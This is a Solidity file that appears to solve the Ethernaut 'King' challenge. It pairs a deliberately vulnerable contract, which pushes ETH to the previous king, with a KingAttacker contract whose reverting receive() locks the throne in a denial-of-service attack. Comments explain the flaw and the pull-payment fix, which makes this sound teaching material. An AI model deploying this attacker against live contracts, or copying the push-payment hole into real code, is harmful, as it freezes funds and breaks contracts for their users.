// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

/**
 * @title King
 * @dev Ethernaut Level 9
 * 
 * VULNERABILITY:
 * The prize is sent to whoever is king via msg.sender.call{value}().
 * If the recipient is a contract that REVERTS on receive(),
 * the prize gets stuck and no one can become king!
 * 
 * This is a Denial of Service (DoS) attack.
 * 
 * LESSON:
 * When sending ETH, handle the case where recipient reverts
 * Use pull pattern or check return value properly
 */
contract King {
    address public king;
    uint256 public prize;
    
    constructor() payable {
        king = msg.sender;
        prize = msg.value;
    }
    
    receive() external payable {
        require(msg.value >= prize, "Not enough ETH to become king");
        
        // Send prize to current king
        // ⚡ This can FAIL if current king is malicious contract!
        (bool success,) = king.call{value: prize}("");
        require(success, "Failed to send prize to previous king");
        
        // Update king
        king = msg.sender;
        prize = msg.value;
    }
    
    function getKing() external view returns (address) {
        return king;
    }
    
    function getPrize() external view returns (uint256) {
        return prize;
    }
}

/**
 * @title KingAttacker
 * @dev Exploit: become king and REVERT on receive() to block future kings
 */
contract KingAttacker {
    King public target;
    
    constructor(address payable _target) {
        target = King(_target);
    }
    
    // Become king with minimal ETH
    function attack() external payable {
        // Send enough ETH to become king
        (bool success,) = address(target).call{value: msg.value}("");
        require(success, "Failed to become king");
    }
    
    // THIS IS THE KEY: reverts on receive()
    // When someone tries to become king, they send ETH to us
    // We REVERT, so the transaction fails
    // No one can become king!
    receive() external payable {
        revert("I am the forever king!");
    }
}
